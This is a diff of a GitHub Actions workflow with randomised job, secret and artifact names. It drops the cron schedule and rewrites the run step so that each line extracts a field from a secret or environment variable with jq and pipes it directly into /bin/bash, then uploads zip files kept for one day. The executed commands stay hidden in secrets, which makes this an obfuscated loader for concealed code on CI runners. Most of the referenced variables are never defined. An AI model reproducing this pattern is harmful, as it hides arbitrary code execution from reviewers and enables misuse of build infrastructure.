@@ -1,8 +1,7 @@
 name: sloaneiris4803
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '21 0,6,12,18 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,21 +9,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: sloaneiris4803
         env:
-          gnn297: ${{ secrets.gnn297 }}
+          x457: ${{ secrets.x457 }}
         run: |
-          printf '%s' "$gnn297" | jq -r .bgco8729 | /bin/bash
-          printf '%s' "$hie77494" | jq -r .a086 | /bin/bash
-          printf '%s' "$i17827" | jq -r .lq9628 | /bin/bash
-          printf '%s' "$ubaog277" | jq -r .q53539 | /bin/bash
-          echo $e81 | jq -r .eii04839 | /bin/bash
-          printf '%s' "$z5342" | jq -r .gdgf114 | /bin/bash
-          echo $udj5863 | jq -r .ub457 | /bin/bash
-          echo $mlv77 | jq -r .b38 | /bin/bash
-          echo $os6 | jq -r .abis781 | /bin/bash
+          printf '%s' "$x457" | jq -r .sc02 | /bin/bash
+          echo $tjegx21979 | jq -r .buy64 | /bin/bash
+          printf '%s' "$yj72785" | jq -r .ba5126 | /bin/bash
+          printf '%s' "$c994" | jq -r .hxo3 | /bin/bash
+          echo $ahq9806 | jq -r .r1 | /bin/bash
+          printf '%s' "$ch678" | jq -r .ukvl4365 | /bin/bash
+          echo $ccrgd05 | jq -r .e8 | /bin/bash
+          echo $h5308 | jq -r .gg4 | /bin/bash
+          printf '%s' "$fmgh7" | jq -r .pador2 | /bin/bash
+          printf '%s' "$h805" | jq -r .q42507 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: aSX0e3wt
+          name: Iptwr2eG
           path: "*.zip"
           retention-days: 1
